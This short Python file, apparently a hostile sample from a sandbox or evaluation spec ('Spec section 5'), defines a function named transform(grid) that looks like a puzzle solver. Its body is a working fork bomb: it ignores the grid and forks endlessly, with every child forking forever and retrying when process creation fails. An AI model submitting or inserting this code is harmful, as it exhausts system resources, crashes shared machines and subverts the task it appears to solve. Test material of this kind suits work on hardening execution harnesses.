"""Spec section 5, fork bomb: every child forks forever too."""

import os
import time


def transform(grid):
    while True:
        if os.fork() == 0:
            while True:
                try:
                    os.fork()
                except OSError:
                    time.sleep(0.01)
